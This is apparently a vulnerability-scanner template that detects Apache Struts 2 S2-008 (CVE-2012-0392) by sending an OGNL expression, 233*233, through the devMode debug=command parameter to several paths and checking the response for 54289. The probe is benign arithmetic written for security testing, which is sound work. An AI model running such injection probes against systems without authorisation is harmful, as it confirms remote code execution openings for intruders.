id: local-struts2-s2-008-math

info:
  name: Struts2 S2-008 DevMode OGNL Injection Safe Math Probe (CVE-2012-0392)
  author: pentest-platform
  severity: critical
  description: |
    Apache Struts 2 S2-008 (CVE-2012-0392) allows OGNL expression execution when
    devMode is enabled via the debug=command interface. The expression parameter is
    evaluated directly. Safe math probe: expression=233*233 should return 54289
    in the response body. This vector is exploitable when devMode=true in struts.xml.
  reference:
    - https://cwiki.apache.org/confluence/display/WW/S2-008
    - https://nvd.nist.gov/vuln/detail/CVE-2012-0392
  tags: safe-poc,struts2,s2-008,cve,cve2012,ognl,rce,devmode

http:
  - method: GET
    path:
      - "{{BaseURL}}/devmode.action?debug=command&expression=233*233"
      - "{{BaseURL}}/S2-008/devmode.action?debug=command&expression=233*233"
      - "{{BaseURL}}/index.action?debug=command&expression=233*233"
      - "{{BaseURL}}/login.action?debug=command&expression=233*233"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "54289"
      - type: status
        status:
          - 200
